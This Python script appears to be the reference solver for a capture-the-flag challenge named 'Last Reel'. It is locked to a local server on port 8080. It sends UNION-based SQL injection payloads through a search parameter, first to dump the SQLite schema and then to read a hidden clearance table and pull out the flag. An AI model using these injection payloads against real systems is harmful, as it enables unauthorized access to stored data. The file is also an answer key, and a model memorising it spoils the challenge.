#!/usr/bin/env python3
"""Solve Last Reel through its documented local HTTP ingress only."""
from __future__ import annotations

import argparse
import html
import re
import sys
import urllib.parse
import urllib.request
from html.parser import HTMLParser

FLAG = re.compile(r"duck\{[a-f0-9]{32}\}")
CARD = re.compile(r'<article\s+[^>]*data-film-card="true"[^>]*>(.*?)</article>', re.DOTALL)
TITLE = re.compile(r"<h3\b[^>]*>(.*?)</h3>", re.DOTALL)
SYNOPSIS = re.compile(r'<p\s+class="synopsis">(.*?)</p>', re.DOTALL)


def local_base(value: str) -> str:
    parsed = urllib.parse.urlsplit(value)
    if parsed.scheme != "http" or parsed.hostname not in {"127.0.0.1", "localhost"}:
        raise ValueError("base URL must use local HTTP")
    if parsed.username or parsed.password or parsed.path not in {"", "/"} or parsed.query or parsed.fragment:
        raise ValueError("base URL must be an origin only")
    if parsed.port != 8080:
        raise ValueError("base URL must use port 8080")
    return f"http://{parsed.hostname}:8080"


def records(page: str) -> list[dict[str, str]]:
    result = []
    for card in CARD.findall(page):
        title = TITLE.search(card)
        synopsis = SYNOPSIS.search(card)
        if title and synopsis:
            result.append({"title": html.unescape(re.sub(r"<[^>]+>", "", title.group(1))).strip(), "synopsis": html.unescape(re.sub(r"<[^>]+>", "", synopsis.group(1))).strip()})
    return result


def request(base: str, query: str) -> str:
    encoded = urllib.parse.urlencode({"q": query})
    opener = urllib.request.build_opener(urllib.request.ProxyHandler({}))
    with opener.open(base + "/search?" + encoded, timeout=5) as response:
        if response.status != 200:
            raise RuntimeError("search endpoint did not return HTTP 200")
        return response.read().decode("utf-8")


def solve(base: str) -> str:
    base = local_base(base)
    schema = request(base, "' AND 1=0 UNION ALL SELECT 0,name,0,sql,'schema' FROM sqlite_master WHERE type='table' -- ")
    if "clearance_records" not in " ".join(row["title"] + " " + row["synopsis"] for row in records(schema)):
        raise RuntimeError("expected clearance table was not returned")
    clearance = request(base, "' AND 1=0 UNION ALL SELECT 0,'Clearance',0,clearance_note,'record' FROM clearance_records -- ")
    match = FLAG.search(clearance)
    if not match:
        raise RuntimeError("final flag was not returned through the intended path")
    return match.group(0)


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--base-url", default="http://127.0.0.1:8080")
    arguments = parser.parse_args()
    try:
        print(solve(arguments.base_url))
    except (OSError, UnicodeError, ValueError, RuntimeError) as error:
        print(f"solver failed: {error}", file=sys.stderr)
        return 1
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
